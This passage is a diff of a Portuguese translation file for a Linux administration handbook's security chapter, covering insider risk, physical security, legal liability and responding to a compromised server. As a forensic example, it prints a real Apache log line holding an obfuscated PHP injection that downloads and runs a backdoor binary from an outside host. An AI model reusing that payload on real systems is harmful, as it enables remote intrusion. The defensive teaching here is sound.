+"escolher o programa mais avançado para uma tarefa pode realmente ser "
+"contraproducente, e uma melhor abordagem é, geralmente, para escolher o "
+"programa mais simples que atenda aos requisitos."
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>VOCABULARY</emphasis> Zero-day exploit"
-msgstr ""
+msgstr "<emphasis>VOCABULARIO</emphasis> Zero-day exploit"
 
 #. Tag: para
 #, no-c-format
 msgid "A <emphasis>zero-day exploit</emphasis> attack is hard to prevent; the term covers a vulnerability that is not yet known to the authors of the program."
 msgstr ""
+"Um ataque zero-day exploit é difícil de evitar, o termo abrange uma "
+"vulnerabilidade que ainda não é conhecida pelos autores do programa."
 
 #. Tag: title
 #, no-c-format
 msgid "Managing a Machine as a Whole"
-msgstr ""
+msgstr "Gerenciando uma Máquina como um Todo"
 
 #. Tag: para
 #, no-c-format
 msgid "Most Linux distributions install by default a number of Unix services and many tools. In many cases, these services and tools are not required for the actual purposes for which the administrator set up the machine. As a general guideline in security matters, unneeded software is best uninstalled. Indeed, there's no point in securing an FTP server, if a vulnerability in a different, unused service can be used to get administrator privileges on the whole machine."
 msgstr ""
+"A maioria das distribuições Linux instalam por padrão uma série de serviços "
+"Unix e muitas ferramentas. Em muitos casos, estes serviços e ferramentas não "
+"são necessários para os fins de reais para que o administrador configure a "
+"máquina. Como orientação geral em matéria de segurança, softwares "
+"desnecessários é melhor desinstalado. Na verdade, não tem sentido garantir "
+"um servidor FTP, se uma vulnerabilidade em um serviço diferente, não "
+"utilizado pode ser usado para obter privilégios de administrador na máquina "
+"inteira."
 
 #. Tag: para
 #, no-c-format
 msgid "By the same reasoning, firewalls will often be configured to only allow access to services that are meant to be publicly accessible."
 msgstr ""
+"Seguindo o mesmo raciocínio, firewalls, frequentemente sao configurados para "
+"permitir apenas acesso aos serviços que se destinam a ser acessíveis ao "
+"público."
 
 #. Tag: para
 #, no-c-format
 msgid "Current computers are powerful enough to allow hosting several services on the same physical machine. From an economic viewpoint, such a possibility is interesting: only one computer to administrate, lower energy consumption, and so on. From the security point of view, however, such a choice can be a problem. One compromised service can bring access to the whole machine, which in turn compromises the other services hosted on the same computer. This risk can be mitigated by isolating the services. This can be attained either with virtualization (each service being hosted in a dedicated virtual machine), or with SELinux (each service daemon having an adequately designed set of permissions)."
 msgstr ""
+"Computadores atuais são poderosos o suficiente para permitir a hospedagem de "
+"vários serviços na mesma máquina física. De um ponto de vista económico, "
+"uma tal possibilidade é interessante: um só computador para administrar, "
+"menor consumo de energia, e assim por diante. Do ponto de vista da "
+"segurança, no entanto, esta escolha pode ser um problema. Um serviço "
+"comprometido pode levar o acesso a toda a máquina, que por sua vez "
+"compromete os outros serviços hospedados no mesmo computador. Este risco "
+"pode ser atenuado através do isolamento dos serviços. Isto pode ser "
+"alcançado tanto com virtualização (cada serviço a ser hospedado em uma "
+"máquina virtual dedicada), ou com o SELinux (cada serviço tem um daemon com "
+"um conjunto de permissões adequadamente projetado)."
 
 #. Tag: title
 #, no-c-format
 msgid "Users Are Players"
-msgstr ""
+msgstr "Os Usuários São Jogadores"
 
 #. Tag: para
 #, no-c-format
 msgid "Discussing security immediately brings to mind protection against attacks by anonymous crackers hiding in the Internet jungle; but an often-forgotten fact is that risks also come from inside: an employee about to leave the company could download sensitive files on the important projects and sell them to competitors, a negligent salesman could leave their desk without locking their session during a meeting with a new prospect, a clumsy user could delete the wrong directory by mistake, and so on."
 msgstr ""
+"Discutir segurança imediatamente traz à mente proteção contra ataques de "
+"crackers anônimos escondidos na selva da Internet, mas um fato muitas vezes "
+"esquecido é que corre o risco de vir também de dentro: um funcionário "
+"prestes a deixar a empresa poderia baixar arquivos confidenciais sobre os "
+"projetos importantes e vendê-los aos concorrentes, um vendedor de negligente "
+"poderia deixar sua mesa sem bloquear a sessão durante um encontro com uma "
+"nova perspectiva, um usuário desajeitado poderia excluir o diretório errado "
+"por engano, e assim por diante."
 
 #. Tag: para
 #, no-c-format
 msgid "The response to these risks can involve technical solutions: no more than the required permissions should be granted to users, and regular backups are a must. But in many cases, the appropriate protection is going to involve training users to avoid the risks."
 msgstr ""
+"A resposta a estes riscos podem envolver soluções técnicas: não mais do que "
+"as permissões necessárias devem ser concedidas aos usuários, e backups "
+"regulares são uma obrigacao. Mas em muitos casos, a protecção adequada vai "
+"envolver treinamento de usuários para evitar os riscos."
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>QUICK LOOK</emphasis> <emphasis role=\"pkg\">autolog</emphasis>"
 msgstr ""
+"<emphasis>BLOQUEIO RAPIDO</emphasis> <emphasis role=\"pkg\">autolog</emphasis>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis role=\"pkg\">autolog</emphasis> package provides a program that automatically disconnects inactive users after a configurable delay. It also allows killing user processes that persist after a session ends, thereby preventing users from running daemons."
 msgstr ""
+"O pacote <emphasis role=\"pkg\">autolog</emphasis> fornece um programa que "
+"desconecta automaticamente usuários inativos depois de um atraso "
+"configurável. Ele também permite matar processos de usuário que persistem "
+"após o término da sessão, impedindo os usuários de executar daemons."
 
 #. Tag: title
 #, no-c-format
 msgid "Physical Security"
-msgstr ""
+msgstr "Seguranca Fisica"
 
 #. Tag: para
 #, no-c-format
 msgid "There is no point in securing the services and networks if the computers themselves are not protected. Important data deserve being stored on hot-swappable hard disks in RAID arrays, because hard disks fail eventually and data availability is a must. But if any pizza delivery boy can enter the building, sneak into the server room and run away with a few selected hard disks, an important part of security is not fulfilled. Who can enter the server room? Is access monitored? These questions deserve consideration (and an answer) when physical security is being evaluated."
 msgstr ""
+"Não faz sentido garantir os serviços e redes, se os próprios computadores "
+"não estiverem protegidos. Dados importantes merecem ser armazenados em "
+"discos rígidos hot-swappable em RAID, por que discos rígidos falham "
+"eventualmente e a disponibilidade dos dados é um ponto obrigatório. Mas se "
+"qualquer entregador de pizza pode entrar no prédio furtivo, na sala do "
+"servidor e fugir com alguns discos rígidos, uma parte importante da "
+"segurança não está cumprida. Quem pode entrar na sala do servidor? O acesso "
+"está monitorado? Estas questões merecem ser consideradas (e uma resposta) "
+"quando a segurança física está sendo avaliada."
 
 #. Tag: para
 #, no-c-format
 msgid "Physical security also includes taking into consideration the risks for accidents such as fires. This particular risk is what justifies storing the backup media in a separate building, or at least in a fire-proof strongbox."
 msgstr ""
+"A segurança física inclui levar em consideração também os riscos de "
+"acidentes, como incêndios. Este risco particular é o que justifica armazenar "
+"as mídias de backup em um prédio separado, ou pelo menos em um cofre à "
+"prova de fogo."
 
 #. Tag: title
 #, no-c-format
 msgid "Legal Liability"
-msgstr ""
+msgstr "Responsabilidade legal"
 
 #. Tag: para
 #, no-c-format
 msgid "An administrator is, more or less implicitly, trusted by their users as well as the users of the network in general. They should therefore avoid any negligence that malevolent people could exploit."
 msgstr ""
+"Um administrador tem, mais ou menos implicitamente, a confiança de seus "
+"usuários, bem como os usuários da rede em geral. Eles devem, portanto, "
+"evitar a negligência que as pessoas malignas poderiam explorar."
 
 #. Tag: para
 #, no-c-format
 msgid "An attacker taking control of your machine then using it as a forward base (known as a “relay system”) from which to perform other nefarious activities could cause legal trouble for you, since the attacked party would initially see the attack coming from your system, and therefore consider you as the attacker (or as an accomplice). In many cases, the attacker will use your server as a relay to send spam, which shouldn't have much impact (except potentially registration on black lists that could restrict your ability to send legitimate emails), but won't be pleasant nevertheless. In other cases, more important trouble can be caused from your machine, for instance denial of service attacks. This will sometimes induce loss of revenue, since the legitimate services will be unavailable and data can be destroyed; sometimes this will also imply a real cost, because the attacked party can start legal proceedings against you. Rights-holders can sue you if an unauthorized copy of a work protected by copyright law is shared from your server, as well as other companies compelled by service level agreements if they are bound to pay penalties following the attack from your machine."
 msgstr ""
+"Um invasor assume o controle da sua máquina, em seguida, a utiliza como uma "
+"base para avancar (conhecido como “relay system - sistema de revezamento\") "
+"da quale para realizar outras atividades nefastas poderia causar problemas "
+"legais para você, uma vez que a parte que atacou inicialmente iria ver o "
+"ataque proveniente de seu sistema e, portanto, considerá-lo como o atacante "
+"(ou como cúmplice). Em muitos casos, o atacante usará o servidor como um "
+"relé para enviar spam, que não deve ter muito impacto (exceto possivelmente "
+"registro em listas negras que poderiam restringir a sua capacidade de enviar "
+"e-mails legítimos), mas não vai ser agradável, no entanto. Em outros casos, "
+"o problema mais importante pode ser causado a partir de sua máquina, por "
+"exemplo, seria ataques de negação de serviço. Isso, às vezes, induz a perda "
+"de receitas, uma vez que os serviços legítimos não estará disponível e os "
+"dados podem ser destruídos, às vezes isso também implicaria um custo real, "
+"porque a parte atacada pode iniciar um processo judicial contra você. Os "
+"dententores dos direitos podem processá-lo se uma cópia não autorizada de "
+"uma obra protegida por direitos autorais é compartilhada a partir do "
+"servidor, bem como outras empresas obrigadas por acordos de nível de "
+"serviço, se eles são obrigados a pagar multas após o ataque de sua máquina."
 
 #. Tag: para
 #, no-c-format
 msgid "When these situations occur, claiming innocence is not usually enough; at the very least, you will need convincing evidence showing suspect activity on your system coming from a given IP address. This won't be possible if you neglect the recommendations of this chapter and let the attacker obtain access to a privileged account (root, in particular) and use it to cover their tracks."
 msgstr ""
+"Quando estas situações ocorrem, afirmar inocência não é geralmente "
+"suficiente; no mínimo, você vai precisar de provas convincentes que mostram "
+"a atividade suspeita em seu sistema que vem de um determinado endereço IP. "
+"Isso não será possível se você negligenciar as recomendações deste capítulo "
+"e deixar o invasor obter acesso a uma conta privilegiada (root, em "
+"particular) e usá la para cobrir seus rastros."
 
 #. Tag: title
 #, no-c-format
 msgid "Dealing with a Compromised Machine"
-msgstr ""
+msgstr "Lidando com uma máquina comprometida"
 
 #. Tag: para
 #, no-c-format
 msgid "Despite the best intentions and however carefully designed the security policy, an administrator eventually faces an act of hijacking. This section provides a few guidelines on how to react when confronted with these unfortunate circumstances."
 msgstr ""
+"Apesar das melhores intenções e por mais cuidadosamente concebido política "
+"da segurança, um administrador, eventualmente, enfrenta um ato de desvio. "
+"Esta seção fornece algumas orientações sobre como reagir quando confrontado "
+"com estas circunstâncias infelizes."
 
 #. Tag: title
 #, no-c-format
 msgid "Detecting and Seeing the Cracker's Intrusion"
-msgstr ""
+msgstr "Detectando e Visualizando a Intrusão do cracker"
 
 #. Tag: para
 #, no-c-format
 msgid "The first step of reacting to cracking is to be aware of such an act. This is not self-evident, especially without an adequate monitoring infrastructure."
 msgstr ""
+"A primeira etapa de reagir a quebra é estar ciente de tal ato. Isso não é "
+"auto-evidente, especialmente sem uma infra-estrutura adequada de vigilância."
 
 #. Tag: para
 #, no-c-format
 msgid "Cracking acts are often not detected until they have direct consequences on the legitimate services hosted on the machine, such as connections slowing down, some users being unable to connect, or any other kind of malfunction. Faced with these problems, the administrator needs to have a good look at the machine and carefully scrutinize what misbehaves. This is usually the time when they discover an unusual process, for instance one named <literal>apache</literal> instead of the standard <literal>/usr/sbin/apache2</literal>. If we follow that example, the thing to do is to note its process identifier, and check <filename>/proc/<replaceable>pid</replaceable>/exe</filename> to see what program this process is currently running:"
 msgstr ""
+"Atos Cracking muitas vezes não são detectados até que eles têm conseqüências "
+"diretas sobre os serviços legítimos hospedados na máquina, como conexões "
+"debilitadas, alguns usuários incapazes de se conectar, ou qualquer outro "
+"tipo de avaria. Diante desses problemas, o administrador precisa dar uma boa "
+"olhada para a máquina e examinar cuidadosamente o que se comporta mal. Este "
+"é geralmente o momento em que eles descobrem um processo incomum, por "
+"exemplo, um chamado <literal>apache</literal> em vez do padrão "
+"<literal>/usr/sbin/apache2</literal>. Se seguirmos esse exemplo, a coisa a "
+"fazer é observar seu identificador de processo, e verificar "
+"<filename>/proc/<replaceable>pid</replaceable>/exe</filename> para ver qual "
+"programa está executando este processo atualmnete:"
 
 #. Tag: screen
 #, no-c-format
@@ -2859,171 +3491,295 @@ msgid "\n"
 "<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>\n"
 "      "
 msgstr ""
+"\n"
+"<computeroutput># </computeroutput><userinput>ls -al "
+"/proc/3719/exe</userinput>\n"
+"<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 "
+"/proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>\n"
+"      "
 
 #. Tag: para
 #, no-c-format
 msgid "A program installed under <filename>/var/tmp/</filename> and running as the web server? No doubt left, the machine is compromised."
 msgstr ""
+"Um programa instalado em <filename>/var/tmp/</filename> e funcionando como "
+"servidor web? Sem deixar dúvida, a máquina está comprometida."
 
 #. Tag: para
 #, no-c-format
 msgid "This is only one example, but many other hints can ring the administrator's bell:"
 msgstr ""
+"Este é apenas um exemplo, mas muitas outras dicas podem alertar o "
+"administrador:"
 
 #. Tag: para
 #, no-c-format
 msgid "an option to a command that no longer works; the version of the software that the command claims to be doesn't match the version that is supposed to be installed according to <command>dpkg</command>;"
 msgstr ""
+"uma opção para um comando que não funciona mais; a versão do software que o "
+"comando pretende ser não coincide com a versão que está supostamente "
+"instalada de acordo com <command>dpkg</command>;"
 
 #. Tag: para
 #, no-c-format
 msgid "a command prompt or a session greeting indicating that the last connection came from an unknown server on another continent;"
 msgstr ""
+"um prompt de comando ou uma sessão de saudação indicando que a última "
+"conexao veio de um servidor desconhecido em outro continente;"
 
 #. Tag: para
 #, no-c-format
 msgid "errors caused by the <filename>/tmp/</filename> partition being full, which turned out to be full of illegal copies of movies;"
 msgstr ""
+"erros causados ​​pela partição <filename>/tmp/</filename> estar cheia, o que "
+"acabou por estar cheio de cópias ilegais de filmes;"
 
 #. Tag: para
 #, no-c-format
 msgid "and so on."
-msgstr ""
+msgstr "entre outros."
 
 #. Tag: title
 #, no-c-format
 msgid "Putting the Server Off-Line"
-msgstr ""
+msgstr "Colocando o servidor Off-Line"
 
 #. Tag: para
 #, no-c-format
 msgid "In any but the most exotic cases, the cracking comes from the network, and the attacker needs a working network to reach their targets (access confidential data, share illegal files, hide their identity by using the machine as a relay, and so on). Unplugging the computer from the network will prevent the attacker from reaching these targets, if they haven't managed to do so yet."
 msgstr ""
+"Em qualquer dos casos porém, os mais exóticos, a quebra vem da rede, e o "
+"invasor precisa de uma rede trabalhando para alcançar as suas metas (acesso "
+"a dados confidenciais, compartilhar arquivos clandestinos, ocultar a sua "
+"identidade utilizando a máquina como de um retransmissor e assim "
+"sucessivamente). Desconectar o computador da rede impedirá que o atacante "
+"alcane esses objetivos, se eles não conseguiram fazer isso ainda."
 
 #. Tag: para
 #, no-c-format
 msgid "This may only be possible if the server is physically accessible. When the server is hosted in a hosting provider's data center halfway across the country, or if the server is not accessible for any other reason, it's usually a good idea to start by gathering some important information (see following sections), then isolating that server as much as possible by shutting down as many services as possible (usually, everything but <command>sshd</command>). This case is still awkward, since one can't rule out the possibility of the attacker having SSH access like the administrator has; this makes it harder to “clean” the machines."
 msgstr ""
+"Isso só é possível se o servidor está fisicamente acessível. Quando o "
+"servidor está hospedado em uma hospedagem no centro provedor de dados do "
+"outro lado do país, ou se o servidor não está acessível por qualquer outro "
+"motivo, é geralmente uma boa idéia começar a reunir alguma informação "
+"importante (ver seções seguintes), então isolar o servidor tanto quanto "
+"possível, fechando tantos serviços quanto possível (geralmente tudo, mas "
+"<command>sshd</command>). Este caso ainda é estranho, pois não se pode "
+"descartar a possibilidade de o atacante ter acesso SSH como o administrador "
+"tem, o que torna mais difícil \"limpar\" as máquinas."
 
 #. Tag: title
 #, no-c-format
 msgid "Keeping Everything that Could Be Used as Evidence"
-msgstr ""
+msgstr "Mantendo Tudo que Poderia Ser Usado como Evidência"
 
 #. Tag: para
 #, no-c-format
 msgid "Understanding the attack and/or engaging legal action against the attackers requires taking copies of all the important elements; this includes the contents of the hard disk, a list of all running processes, and a list of all open connections. The contents of the RAM could also be used, but it is rarely used in practice."
 msgstr ""
+"Compreender o ataque e/ou ação legal contra os atacantes envolvente requer "
+"uma tomada de cópias de todos os elementos relevantes, o que inclui o "
+"conteúdo do disco rígido, uma lista de todos os processos em execução, e uma "
+"lista de todas as conexões abertas. O conteúdo da memória RAM também "
+"poderia ser usado, mas é raramente utilizado na prática."
 
 #. Tag: para
 #, no-c-format
 msgid "In the heat of action, administrators are often tempted to perform many checks on the compromised machine; this is usually not a good idea. Every command is potentially subverted and can erase pieces of evidence. The checks should be restricted to the minimal set (<command>netstat -tupan</command> for network connections, <command>ps auxf</command> for a list of processes, <command>ls -alR /proc/[0-9]*</command> for a little more information on running programs), and every performed check should carefully be written down."
 msgstr ""
+"No calor da ação, os administradores são muitas vezes tentados a realizar "
+"muitas verificações na máquina comprometida; esta geralmente não é uma boa "
+"idéia. Cada comando é potencialmente subvertido e pode apagar elementos de "
+"prova. Os cheques devem ser restritas ao conjunto mínimo (<command>netstat "
+"-tupan</ command> para conexões de rede, <command>ps auxf</command> para uma "
+"lista de processos, <command>ls -alR /proc/[0-9]*</command> para um pouco "
+"mais de informação sobre a execução de programas), e cada seleção realizada "
+"deve ser cuidadosamente anotada."
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>CAUTION</emphasis> Hot analysis"
-msgstr ""
+msgstr "<emphasis>ATENCAO</emphasis> Analise Quente"
 
 #. Tag: para
 #, no-c-format
 msgid "While it may seem tempting to analyze the system as it runs, especially when the server is not physically reachable, this is best avoided: quite simply you can't trust the programs currently installed on the compromised system. It's quite possible for a subverted <command>ps</command> command to hide some processes, or for a subverted <command>ls</command> to hide files; sometimes even the kernel is compromised!"
 msgstr ""
+"Embora possa parecer tentador analisar o sistema como ele executa, "
+"especialmente quando o servidor não é fisicamente acessível, este é melhor "
+"evitar: simplesmente você não pode confiar nos programas instalados no "
+"sistema comprometido. É bem possível que um subvertido comando "
+"<command>ps</command> para esconder alguns processos, ou para um comando "
+"<command>ls</command> subvertido para esconder arquivos, às vezes até mesmo "
+"o kernel é comprometido!"
 
 #. Tag: para
 #, no-c-format
 msgid "If such a hot analysis is still required, care should be taken to only use known-good programs. A good way to do that would be to have a rescue CD with pristine programs, or a read-only network share. However, even those countermeasures may not be enough if the kernel itself is compromised."
 msgstr ""
+"Se uma análise tão quente ainda é necessária, deve ser tomado o cuidado de "
+"usar somente os bons programas conhecidos. Uma boa maneira de fazer isso "
+"seria ter um CD de recuperação com programas imaculados, ou um "
+"compartilhamento de rede somente leitura. No entanto, mesmo essas "
+"contramedidas podem não ser suficientes se o kernel em si está comprometido."
 
 #. Tag: para
 #, no-c-format
 msgid "Once the “dynamic” elements have been saved, the next step is to store a complete image of the hard-disk. Making such an image is impossible if the filesystem is still evolving, which is why it must be remounted read-only. The simplest solution is often to halt the server brutally (after running <command>sync</command>) and reboot it on a rescue CD. Each partition should be copied with a tool such as <command>dd</command>; these images can be sent to another server (possibly with the very convenient <command>nc</command> tool). Another possibility may be even simpler: just get the disk out of the machine and replace it with a new one that can be reformatted and reinstalled."
 msgstr ""
+"Uma vez que os elementos \"dinâmicos\" foram salvos, o próximo passo é "
+"armazenar uma imagem completa do disco rígido. Fazer tal imagem é impossível "
+"se o sistema ainda está executando, é por isso que deve ser remontado "
+"somente para leitura. A solução mais simples é muitas vezes parar o servidor "
+"brutalmente (após a execucao de <command>sync</command>) e reiniciá-lo em "
+"um CD de recuperação. Cada partição deve ser copiada com uma ferramenta como "
+"o <command>dd</command>, estas imagens podem ser enviadas para outro "
+"servidor (possivelmente com a muito conveniente ferramenta <command>nc</ "
+"command>). Outra possibilidade pode ser ainda mais simples: é só pegar o "
+"disco da máquina e substituí-lo por um novo que pode ser reformatado e "
+"reinstalado."
 
 #. Tag: title
 #, no-c-format
 msgid "Re-installing"
-msgstr ""
+msgstr "Reinstalando"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>backdoor</primary>"
-msgstr ""
+msgstr "<primary>backdoor</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The server should not be brought back on line without a complete reinstallation. If the compromise was severe (if administrative privileges were obtained), there is almost no other way to be sure that we're rid of everything the attacker may have left behind (particularly <emphasis>backdoors</emphasis>). Of course, all the latest security updates must also be applied so as to plug the vulnerability used by the attacker. Ideally, analyzing the attack should point at this attack vector, so one can be sure of actually fixing it; otherwise, one can only hope that the vulnerability was one of those fixed by the updates."
 msgstr ""
+"O servidor não deve ser trazido de volta em linha sem uma reinstalação "
+"completa. Se o comprometimento foi grave (se privilégios administrativos "
+"foram obtidos), não há quase nenhuma outra maneira de ter certeza de que "
+"estamos livres de tudo o que o invasor pode ter deixado para trás "
+"(particularmente <emphasis>backdoors</emphasis>). Naturalmente, todas as "
+"últimas atualizações de segurança devem também ser aplicadas de modo a "
+"conectar a vulnerabilidade utilizada pelo invasor. O ideal, analisando o "
+"ataque deve apontar para este vetor de ataque, para que se possa ter certeza "
+"de efetivamente corrigi-lo, caso contrário, só se pode esperar que a "
+"vulnerabilidade foi um daqueles fixados pelas atualizações."
 
 #. Tag: para
 #, no-c-format
 msgid "Reinstalling a remote server is not always easy; it may involve assistance from the hosting company, because not all such companies provide automated reinstallation systems. Care should be taken not to reinstall the machine from backups taken later than the compromise. Ideally, only data should be restored, the actual software should be reinstalled from the installation media."
 msgstr ""
+"Reinstalar um servidor remoto não é sempre fácil, pode envolver a "
+"assistência da empresa de hospedagem, porque nem todas as empresas oferecem "
+"sistemas automatizados de reinstalação. Cuidados devem ser tomados para não "
+"reinstalar a máquina a partir de backups feitos depois do compromisso. "
+"Idealmente, os dados devem ser restaurados, o próprio software deve ser "
+"reinstalado a partir da mídia de instalação."
 
 #. Tag: title
 #, no-c-format
 msgid "Forensic Analysis"
-msgstr ""
+msgstr "Analise Fonrense"
 
 #. Tag: para
 #, no-c-format
 msgid "Now that the service has been restored, it is time to have a closer look at the disk images of the compromised system in order to understand the attack vector. When mounting these images, care should be taken to use the <literal>ro,nodev,noexec,noatime</literal> options so as to avoid changing the contents (including timestamps of access to files) or running compromised programs by mistake."
 msgstr ""
+"Agora que o serviço foi restaurado, é hora de dar uma olhada nas imagens de "
+"disco do sistema comprometido a fim de compreender o vetor de ataque. Ao "
+"montar essas imagens, deve se tomar cuidado e usar as opções <literal>ro, "
+"nodev, noexec, noatime</literal> de modo a evitar alteração dos conteúdos "
+"(incluindo marcas de tempo de acesso a arquivos) ou a execução de programas "
+"comprometidos por engano."
 
 #. Tag: para
 #, no-c-format
 msgid "Retracing an attack scenario usually involves looking for everything that was modified and executed:"
 msgstr ""
+"Refazendo um cenário de ataque geralmente envolve olhar para tudo o que foi "
+"modificado e executado:"
 
 #. Tag: para
 #, no-c-format
 msgid "<filename>.bash_history</filename> files often provide for a very interesting read;"
 msgstr ""
+"arquivos <filename>.bash_history</filename> muitas vezes prevem uma leitura "
+"muito interessante;"
 
 #. Tag: para
 #, no-c-format
 msgid "so does listing files that were recently created, modified or accessed;"
 msgstr ""
+"o mesmo acontece listando arquivos que foram recentemente criados, "
+"modificados ou acessados​​;"
 
 #. Tag: para
 #, no-c-format
 msgid "the <command>strings</command> command helps identifying programs installed by the attacker, by extracting text strings from a binary;"
 msgstr ""
+"o comando <command>strings</command> ajuda a identificar programas "
+"instalados pelo atacante, extraindo seqüências de texto de um binário;"
 
 #. Tag: para
 #, no-c-format
 msgid "the log files in <filename>/var/log/</filename> often allow reconstructing a chronology of events;"
 msgstr ""
+"os arquivos de log em <filename>/var/log/</filename> muitas vezes permitem "
+"reconstruir uma cronologia dos eventos;"
 
 #. Tag: para
 #, no-c-format
 msgid "special-purpose tools also allow restoring the contents of potentially deleted files, including log files that attackers often delete."
 msgstr ""
+"ferramentas special-purpose também permitem restaurar o conteúdo de arquivos "
+"potencialmente excluídos, incluindo arquivos de log que os atacantes muitas "
+"vezes excluíram."
 
 #. Tag: para
 #, no-c-format
 msgid "Some of these operations can be made easier with specialized software. In particular, <emphasis>The Coroner Toolkit</emphasis> (in the <emphasis role=\"pkg\">tct</emphasis> package) is a collection of such tools. It includes several tools; amongst these, <command>grave-robber</command> can collect data from a running compromised system, <command>lazarus</command> extracts often interesting data from non-allocated regions on disks, and <command>pcat</command> can copy the memory used by a process; other data extraction tools are also included. <indexterm><primary>The Coroner Toolkit</primary></indexterm>"
 msgstr ""
+"Algumas destas operações podem ser feita mais facilmente com software "
+"especializado. Em particular, <emphasis>The Coroner Toolkit</emphasis> (no "
+"pacote <emphasis role=\"pkg\">tct</emphasis>) é uma coleção de tais "
+"ferramentas. Ele inclui várias ferramentas; entre estes, <command>grave-"
+"robber</command> pode coletar dados de um sistema em execução comprometido, "
+"<command>lazarus</command> extrai dados interessantes, muitas vezes "
+"provenientes de regiões nao alocados em discos e <command>pcat</command> "
+"pode copiar a memória usada por um processo; outras ferramentas de extração "
+"de dados também são incluídas. <indexterm><primary>O Coroner "
+"Toolkit</primary></indexterm>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis role=\"pkg\">sleuthkit</emphasis> package provides a few other tools to analyze a filesystem. Their use is made easier by the <emphasis>Autopsy Forensic Browser</emphasis> graphical interface (in the <emphasis role=\"pkg\">autopsy</emphasis> package). <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>"
 msgstr ""
+"O pacote <emphasis role=\"pkg\">sleuthkit</emphasis> fornece algumas outras "
+"ferramentas para analisar um sistema de arquivos. Seu uso é facilitado pela "
+"interface gráfica <emphasis>Autopsy Forensic Browser</emphasis> (no pacote "
+"de <emphasis role=\"pkg\">autopsy</emphasis> ). <indexterm><primary>Autopsy "
+"Forensic Browser</primary></indexterm>"
 
 #. Tag: title
 #, no-c-format
 msgid "Reconstituting the Attack Scenario"
-msgstr ""
+msgstr "Reconstituindo o Cenário do Ataque"
 
 #. Tag: para
 #, no-c-format
 msgid "All the elements collected during the analysis should fit together like pieces in a jigsaw puzzle; the creation of the first suspect files is often correlated with logs proving the breach. A real-world example should be more explicit than long theoretical ramblings."
 msgstr ""
+"Todos os elementos recolhidos durante a análise devem se encaixar como peças "
+"de um quebra-cabeça, a criação dos primeiros arquivos suspeitos é muitas "
+"vezes relacionada aos registros que comprovam a violação. A exemplo do mundo "
+"real deve ser mais explícito do que longas divagações teóricas."
 
 #. Tag: para
 #, no-c-format
 msgid "The following log is an extract from an Apache <filename>access.log</filename>:"
 msgstr ""
+"O registo seguinte foi extraido de um Apache "
+"<filename>access.log</filename>:"
 
 #. Tag: programlisting
 #, no-c-format
@@ -3031,21 +3787,59 @@ msgid "\n"
 "www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] \"GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1\" 200 27969 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\"\n"
 "      "
 msgstr ""
+"\n"
+"www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] \"GET "
+"/phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%"
+"252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%"
+"252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%"
+"252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%"
+"252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%"
+"252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)"
+"%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%"
+"252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%"
+"252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%"
+"252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%"
+"252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%"
+"252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%"
+"252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%"
+"252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%"
+"252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%"
+"252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%"
+"252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%"
+"252echr(32)%252echr(38))%252e%2527 HTTP/1.1\" 200 27969 \"-\" \"Mozilla/4.0 "
